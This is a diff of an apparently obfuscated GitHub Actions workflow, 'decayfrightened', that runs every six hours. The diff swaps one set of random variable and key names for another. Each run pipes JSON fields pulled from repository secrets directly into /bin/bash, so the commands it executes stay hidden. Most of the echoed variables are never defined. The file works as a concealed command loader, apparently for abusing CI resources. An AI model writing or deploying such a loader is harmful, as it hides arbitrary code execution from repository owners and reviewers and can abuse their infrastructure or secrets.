@@ -1,9 +1,8 @@
 name: decayfrightened
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 3/6 * * *'
+    - cron: '4 0/6 * * *'
 
 jobs:
   build:
@@ -13,22 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: decayfrightened
         env:
-          ar1: ${{ secrets.ar1 }}
+          nlwq972: ${{ secrets.nlwq972 }}
         run: |
-          echo $ar1 | jq -r .dyufm21450 | /bin/bash
-          echo $u01622 | jq -r .gb68 | /bin/bash
-          echo $k329 | jq -r .k9975 | /bin/bash
-          echo $i1 | jq -r .rdd92 | /bin/bash
-          echo $ndsgn40820 | jq -r .kr13657 | /bin/bash
-          echo $echm563 | jq -r .quan897 | /bin/bash
-          echo $gby3 | jq -r .cbtc50 | /bin/bash
-          echo $x9475 | jq -r .uzg66 | /bin/bash
-          echo $lhqh76286 | jq -r .gwt9170 | /bin/bash
-          echo $rkdq27 | jq -r .giplj7032 | /bin/bash
-          echo $sgsa215 | jq -r .ow8627 | /bin/bash
-          echo $voc5 | jq -r .lum71728 | /bin/bash
-          echo $e18 | jq -r .lruq14167 | /bin/bash
-          echo $nkq31 | jq -r .g7950 | /bin/bash
-          echo $zluye97 | jq -r .x224 | /bin/bash
-          echo $x3324 | jq -r .dbzs03 | /bin/bash
+          echo $nlwq972 | jq -r .c325 | /bin/bash
+          echo $hneps6 | jq -r .td53 | /bin/bash
+          echo $hk26 | jq -r .hq59900 | /bin/bash
+          echo $fzvh4 | jq -r .jofzf2 | /bin/bash
+          echo $hfq32652 | jq -r .quvew1529 | /bin/bash
+          echo $loja5002 | jq -r .y4 | /bin/bash
+          echo $ixtkp6670 | jq -r .lvayl8 | /bin/bash
+          echo $uts682 | jq -r .o58649 | /bin/bash
+          echo $y0 | jq -r .iifw9070 | /bin/bash
+          echo $vf46339 | jq -r .e305 | /bin/bash
+          echo $w680 | jq -r .bgp486 | /bin/bash
+          echo $sxo19116 | jq -r .kw3 | /bin/bash
+          echo $ptdbd12 | jq -r .iexr3812 | /bin/bash
+          echo $veejk05 | jq -r .sgmcw00 | /bin/bash
+          echo $iggr08657 | jq -r .huzf95 | /bin/bash
 
